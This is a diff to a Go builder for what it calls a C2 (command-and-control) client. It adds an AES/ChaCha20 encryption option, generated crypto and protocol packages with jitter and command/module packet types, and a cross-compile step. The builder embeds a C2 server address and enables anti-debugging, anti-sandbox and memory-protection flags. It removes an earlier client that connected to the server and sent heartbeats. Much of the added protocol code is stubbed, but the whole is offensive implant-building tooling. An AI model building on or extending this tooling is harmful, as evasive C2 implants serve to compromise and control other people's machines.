@@ -21,6 +21,7 @@ type BuildConfig struct {
 	Modules          []string
 	TargetOS         string
 	TargetArch       string
+	EncryptionAlg    string
 	EnableAntiDebug  bool
 	EnableAntiSandbox bool
 	EnableMemProtect bool
@@ -78,6 +79,7 @@ var BuildConfig = struct {
 	ServerAddr        string
 	Protocols         []string
 	Modules           []string
+	EncryptionAlg     string
 	EnableAntiDebug   bool
 	EnableAntiSandbox bool
 	EnableMemProtect  bool
@@ -91,6 +93,7 @@ var BuildConfig = struct {
 	ServerAddr:        "{{.ServerAddr}}",
 	Protocols:         []string{{"{"}}{{range $index, $protocol := .Protocols}}{{if $index}}, {{end}}"{{$protocol}}"{{end}}{{"}"}},
 	Modules:           []string{{"{"}}{{range $index, $module := .Modules}}{{if $index}}, {{end}}"{{$module}}"{{end}}{{"}"}},
+	EncryptionAlg:     "{{.EncryptionAlg}}",
 	EnableAntiDebug:   {{.EnableAntiDebug}},
 	EnableAntiSandbox: {{.EnableAntiSandbox}},
 	EnableMemProtect:  {{.EnableMemProtect}},
@@ -111,6 +114,7 @@ func main() {
 	serverAddr := flag.String("server", "", "Default C2 server address to embed")
 	targetOS := flag.String("os", runtime.GOOS, "Target operating system (windows, linux, darwin)")
 	targetArch := flag.String("arch", runtime.GOARCH, "Target architecture (amd64, 386, arm64)")
+	encryptionAlg := flag.String("encryption", "aes", "Encryption algorithm to use (aes, chacha20)")
 	enableAntiDebug := flag.Bool("anti-debug", true, "Enable anti-debugging measures")
 	enableAntiSandbox := flag.Bool("anti-sandbox", true, "Enable anti-sandbox measures")
 	enableMemProtect := flag.Bool("mem-protect", true, "Enable memory protection")
@@ -173,6 +177,13 @@ func main() {
 		}
 	}
 
+	// Validate encryption algorithm
+	if *encryptionAlg != "aes" && *encryptionAlg != "chacha20" {
+		fmt.Printf("Error: Unknown encryption algorithm '%s'\n", *encryptionAlg)
+		fmt.Println("Available encryption algorithms: aes, chacha20")
+		os.Exit(1)
+	}
+
 	// Ensure output file has proper extension based on target OS
 	if filepath.Ext(*outputFile) == "" {
 		if *targetOS == "windows" {
@@ -188,6 +199,7 @@ func main() {
 		Modules:          modules,
 		TargetOS:         *targetOS,
 		TargetArch:       *targetArch,
+		EncryptionAlg:    *encryptionAlg,
 		EnableAntiDebug:  *enableAntiDebug,
 		EnableAntiSandbox: *enableAntiSandbox,
 		EnableMemProtect: *enableMemProtect,
@@ -423,6 +435,7 @@ func generateConfigFile(config BuildConfig, clientDir string) error {
 		ServerAddr        string
 		Protocols         []string
 		Modules           []string
+		EncryptionAlg     string
 		EnableAntiDebug   bool
 		EnableAntiSandbox bool
 		EnableMemProtect  bool
@@ -437,6 +450,7 @@ func generateConfigFile(config BuildConfig, clientDir string) error {
 		ServerAddr:        config.ServerAddr,
 		Protocols:         config.Protocols,
 		Modules:           config.Modules,
+		EncryptionAlg:     config.EncryptionAlg,
 		EnableAntiDebug:   config.EnableAntiDebug,
 		EnableAntiSandbox: config.EnableAntiSandbox,
 		EnableMemProtect:  config.EnableMemProtect,
@@ -465,84 +479,391 @@ func copyClientFiles(config BuildConfig, clientDir string) error {
 		return fmt.Errorf("failed to create cmd/client directory: %w", err)
 	}
 
-	// Use a simplified client implementation
+	// Use the client template
 	dstMainFile := filepath.Join(cmdClientDir, "main.go")
 	
-	// Simple client template
-	simpleClientTemplate := `package main
+	// Write the client template to the main.go file
+	err = os.WriteFile(dstMainFile, []byte(clientTemplate), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write client implementation: %w", err)
+	}
+	
+	// Create pkg/crypto directory
+	pkgCryptoDir := filepath.Join(clientDir, "pkg", "crypto")
+	err = os.MkdirAll(pkgCryptoDir, 0755)
+	if err != nil {
+		return fmt.Errorf("failed to create pkg/crypto directory: %w", err)
+	}
+	
+	// Create pkg/protocol directory
+	pkgProtocolDir := filepath.Join(clientDir, "pkg", "protocol")
+	err = os.MkdirAll(pkgProtocolDir, 0755)
+	if err != nil {
+		return fmt.Errorf("failed to create pkg/protocol directory: %w", err)
+	}
+	
+	// Create basic crypto package
+	cryptoFile := filepath.Join(pkgCryptoDir, "crypto.go")
+	cryptoContent := `package crypto
 
 import (
-	"flag"
+	"crypto/rand"
 	"fmt"
-	"net"
-	"os"
-	"os/signal"
-	"strings"
-	"syscall"
+	"io"
 	"time"
 )
 
-func main() {
-	// Parse command line flags
-	serverAddr := flag.String("server", "", "C2 server address")
-	protocolList := flag.String("protocol", "tcp", "Comma-separated list of protocols to use (tcp,http,websocket)")
-	flag.Parse()
+// SessionID represents a unique session identifier
+type SessionID string
 
-	if *serverAddr == "" {
-		fmt.Println("Error: Server address is required")
-		flag.Usage()
-		os.Exit(1)
+// Encryptor interface defines methods for encryption operations
+type Encryptor interface {
+	Encrypt(data []byte) ([]byte, error)
+	Decrypt(data []byte) ([]byte, error)
+	GetAlgorithm() string
+}
+
+// NewEncryptor creates a new encryptor based on the algorithm
+func NewEncryptor(algorithm string) (Encryptor, error) {
+	switch algorithm {
+	case "aes":
+		return NewAESEncryptor()
+	case "chacha20":
+		return NewChacha20Encryptor()
+	default:
+		return nil, fmt.Errorf("unsupported encryption algorithm: %s", algorithm)
 	}
+}
 
-	// Parse protocol list
-	protocols := strings.Split(*protocolList, ",")
-	if len(protocols) == 0 {
-		fmt.Println("Error: At least one valid protocol must be specified")
-		flag.Usage()
-		os.Exit(1)
-	}
-
-	fmt.Println("Client started with configuration:")
-	fmt.Println("- Server:", *serverAddr)
-	fmt.Println("- Protocols:", *protocolList)
-
-	// Connect to server
-	conn, err := net.Dial("tcp", *serverAddr)
+// GenerateSessionID generates a new random session ID
+func GenerateSessionID() SessionID {
+	b := make([]byte, 16)
+	_, err := io.ReadFull(rand.Reader, b)
 	if err != nil {
-		fmt.Printf("Error connecting to server: %v\n", err)
-		os.Exit(1)
+		// If random fails, use a timestamp-based ID
+		return SessionID(fmt.Sprintf("session-%d", time.Now().UnixNano()))
 	}
-	defer conn.Close()
-
-	fmt.Println("C2 Client started. Connected to server:", *serverAddr)
-	fmt.Println("Using protocols:", *protocolList)
-
-	// Setup signal handling for graceful shutdown
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-
-	// Start heartbeat
-	go func() {
-		for {
-			time.Sleep(30 * time.Second)
-			_, err := conn.Write([]byte("heartbeat"))
-			if err != nil {
-				fmt.Printf("Error sending heartbeat: %v\n", err)
-				return
-			}
-		}
-	}()
-
-	// Wait for termination signal
-	<-sigChan
-	fmt.Println("\nShutting down client...")
+	return SessionID(fmt.Sprintf("%x", b))
+}
+`
 	
-	fmt.Println("Client shutdown complete.")
-}`
-	
-	err = os.WriteFile(dstMainFile, []byte(simpleClientTemplate), 0644)
+	err = os.WriteFile(cryptoFile, []byte(cryptoContent), 0644)
 	if err != nil {
-		return fmt.Errorf("failed to write simplified client implementation: %w", err)
+		return fmt.Errorf("failed to write crypto.go: %w", err)
+	}
+	
+	// Create AES encryptor
+	aesFile := filepath.Join(pkgCryptoDir, "aes.go")
+	aesContent := `package crypto
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"errors"
+	"io"
+)
+
+// AESEncryptor implements the Encryptor interface using AES
+type AESEncryptor struct {
+	key []byte
+}
+
+// NewAESEncryptor creates a new AES encryptor
+func NewAESEncryptor() (*AESEncryptor, error) {
+	// Generate a random key
+	key := make([]byte, 32) // AES-256
+	if _, err := io.ReadFull(rand.Reader, key); err != nil {
+		return nil, err
+	}
+	
+	return &AESEncryptor{
+		key: key,
+	}, nil
+}
+
+// Encrypt encrypts data using AES-GCM
+func (e *AESEncryptor) Encrypt(data []byte) ([]byte, error) {
+	block, err := aes.NewCipher(e.key)
+	if err != nil {
+		return nil, err
+	}
+	
+	// Generate a nonce
+	nonce := make([]byte, 12)
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return nil, err
+	}
+	
+	// Create the GCM mode
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	
+	// Encrypt and authenticate
+	ciphertext := aesgcm.Seal(nil, nonce, data, nil)
+	
+	// Prepend the nonce to the ciphertext
+	result := make([]byte, len(nonce)+len(ciphertext))
+	copy(result, nonce)
+	copy(result[len(nonce):], ciphertext)
+	
+	return result, nil
+}
+
+// Decrypt decrypts data using AES-GCM
+func (e *AESEncryptor) Decrypt(data []byte) ([]byte, error) {
+	if len(data) < 12 {
+		return nil, errors.New("ciphertext too short")
+	}
+	
+	// Extract the nonce
+	nonce := data[:12]
+	ciphertext := data[12:]
+	
+	// Create the cipher
+	block, err := aes.NewCipher(e.key)
+	if err != nil {
+		return nil, err
+	}
+	
+	// Create the GCM mode
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	
+	// Decrypt and verify
+	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return nil, err
+	}
+	
+	return plaintext, nil
+}
+
+// GetAlgorithm returns the encryption algorithm name
+func (e *AESEncryptor) GetAlgorithm() string {
+	return "aes"
+}
+`
+	
+	err = os.WriteFile(aesFile, []byte(aesContent), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write aes.go: %w", err)
+	}
+	
+	// Create ChaCha20 encryptor
+	chachaFile := filepath.Join(pkgCryptoDir, "chacha20.go")
+	chachaContent := `package crypto
+
+import (
+	"crypto/rand"
+	"errors"
+	"io"
+	
+	"golang.org/x/crypto/chacha20poly1305"
+)
+
+// Chacha20Encryptor implements the Encryptor interface using ChaCha20-Poly1305
+type Chacha20Encryptor struct {
+	key []byte
+}
+
+// NewChacha20Encryptor creates a new ChaCha20-Poly1305 encryptor
+func NewChacha20Encryptor() (*Chacha20Encryptor, error) {
+	// Generate a random key
+	key := make([]byte, chacha20poly1305.KeySize)
+	if _, err := io.ReadFull(rand.Reader, key); err != nil {
+		return nil, err
+	}
+	
+	return &Chacha20Encryptor{
+		key: key,
+	}, nil
+}
+
+// Encrypt encrypts data using ChaCha20-Poly1305
+func (e *Chacha20Encryptor) Encrypt(data []byte) ([]byte, error) {
+	aead, err := chacha20poly1305.New(e.key)
+	if err != nil {
+		return nil, err
+	}
+	
+	// Generate a nonce
+	nonce := make([]byte, aead.NonceSize())
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return nil, err
+	}
+	
+	// Encrypt and authenticate
+	ciphertext := aead.Seal(nil, nonce, data, nil)
+	
+	// Prepend the nonce to the ciphertext
+	result := make([]byte, len(nonce)+len(ciphertext))
+	copy(result, nonce)
+	copy(result[len(nonce):], ciphertext)
+	
+	return result, nil
+}
+
+// Decrypt decrypts data using ChaCha20-Poly1305
+func (e *Chacha20Encryptor) Decrypt(data []byte) ([]byte, error) {
+	aead, err := chacha20poly1305.New(e.key)
+	if err != nil {
+		return nil, err
+	}
+	
+	nonceSize := aead.NonceSize()
+	if len(data) < nonceSize {
+		return nil, errors.New("ciphertext too short")
+	}
+	
+	// Extract the nonce
+	nonce := data[:nonceSize]
+	ciphertext := data[nonceSize:]
+	
+	// Decrypt and verify
+	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return nil, err
+	}
+	
+	return plaintext, nil
+}
+
+// GetAlgorithm returns the encryption algorithm name
+func (e *Chacha20Encryptor) GetAlgorithm() string {
+	return "chacha20"
+}
+`
+	
+	err = os.WriteFile(chachaFile, []byte(chachaContent), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write chacha20.go: %w", err)
+	}
+	
+	// Create basic protocol package
+	protocolFile := filepath.Join(pkgProtocolDir, "protocol.go")
+	protocolContent := `package protocol
+
+import (
+	"errors"
+	"client/pkg/crypto"
+)
+
+// PacketType represents the type of packet
+type PacketType uint8
+
+const (
+	PacketTypeHeartbeat      PacketType = 0
+	PacketTypeCommand        PacketType = 1
+	PacketTypeResponse       PacketType = 2
+	PacketTypeError          PacketType = 3
+	PacketTypeProtocolSwitch PacketType = 4
+	PacketTypeKeyExchange    PacketType = 5
+	PacketTypeModuleData     PacketType = 6
+	PacketTypeModuleResponse PacketType = 7
+)
+
+// PacketHeader represents the header of a packet
+type PacketHeader struct {
+	Type       PacketType
+	TaskID     uint32
+	DataLength uint32
+	Flags      uint8
+}
+
+// Packet represents a communication packet
+type Packet struct {
+	Header PacketHeader
+	Data   []byte
+}
+
+// NewPacket creates a new packet
+func NewPacket(packetType PacketType, data []byte) *Packet {
+	dataLen := uint32(0)
+	if data != nil {
+		dataLen = uint32(len(data))
+	}
+	
+	return &Packet{
+		Header: PacketHeader{
+			Type:       packetType,
+			TaskID:     0,
+			DataLength: dataLen,
+			Flags:      0,
+		},
+		Data: data,
+	}
+}
+
+// SetTaskID sets the task ID for the packet
+func (p *Packet) SetTaskID(taskID uint32) {
+	p.Header.TaskID = taskID
+}
+
+// ProtocolHandler handles protocol operations
+type ProtocolHandler struct {
+	encryptor      crypto.Encryptor
+	jitterEnabled  bool
+	jitterMinDelay int
+	jitterMaxDelay int
+}
+
+// NewProtocolHandler creates a new protocol handler
+func NewProtocolHandler() *ProtocolHandler {
+	return &ProtocolHandler{
+		encryptor:      nil,
+		jitterEnabled:  true,
+		jitterMinDelay: 100, // milliseconds
+		jitterMaxDelay: 1000, // milliseconds
+	}
+}
+
+// CreateSession creates a new encryption session
+func (h *ProtocolHandler) CreateSession(sessionID crypto.SessionID, algorithm string) error {
+	var err error
+	h.encryptor, err = crypto.NewEncryptor(algorithm)
+	return err
+}
+
+// SetJitterEnabled enables or disables communication jitter
+func (h *ProtocolHandler) SetJitterEnabled(enabled bool) {
+	h.jitterEnabled = enabled
+}
+
+// SetJitterRange sets the jitter delay range
+func (h *ProtocolHandler) SetJitterRange(minDelay, maxDelay int) {
+	h.jitterMinDelay = minDelay
+	h.jitterMaxDelay = maxDelay
+}
+
+// EncryptPacket encrypts a packet
+func (h *ProtocolHandler) EncryptPacket(packet *Packet) ([]byte, error) {
+	if h.encryptor == nil {
+		return nil, errors.New("encryptor not initialized")
+	}
+	
+	// TODO: Implement packet serialization and encryption
+	return nil, errors.New("not implemented")
+}
+
+// DecryptPacket decrypts a packet
+func (h *ProtocolHandler) DecryptPacket(data []byte) (*Packet, error) {
+	if h.encryptor == nil {
+		return nil, errors.New("encryptor not initialized")
+	}
+	
+	// TODO: Implement packet deserialization and decryption
+	return nil, errors.New("not implemented")
+}
+`
+	
+	err = os.WriteFile(protocolFile, []byte(protocolContent), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write protocol.go: %w", err)
 	}
 
 	return nil
@@ -608,6 +929,19 @@ func compileClient(config BuildConfig, clientDir string, verbose bool) error {
 	env := os.Environ()
 	env = append(env, fmt.Sprintf("GOOS=%s", config.TargetOS))
 	env = append(env, fmt.Sprintf("GOARCH=%s", config.TargetArch))
+
+	// Install required dependencies
+	getCmd := exec.Command("go", "get", "golang.org/x/crypto/chacha20poly1305")
+	getCmd.Dir = clientDir
+	if verbose {
+		getCmd.Stdout = os.Stdout
+		getCmd.Stderr = os.Stderr
+	}
+	
+	if err := getCmd.Run(); err != nil {
+		fmt.Printf("Warning: Failed to get dependencies: %v\n", err)
+		// Continue anyway, as the dependency might already be installed
+	}
 
 	// Build command - specify the package to build
 	cmd := exec.Command("go", "build", "-o", config.OutputFile, "./cmd/client")
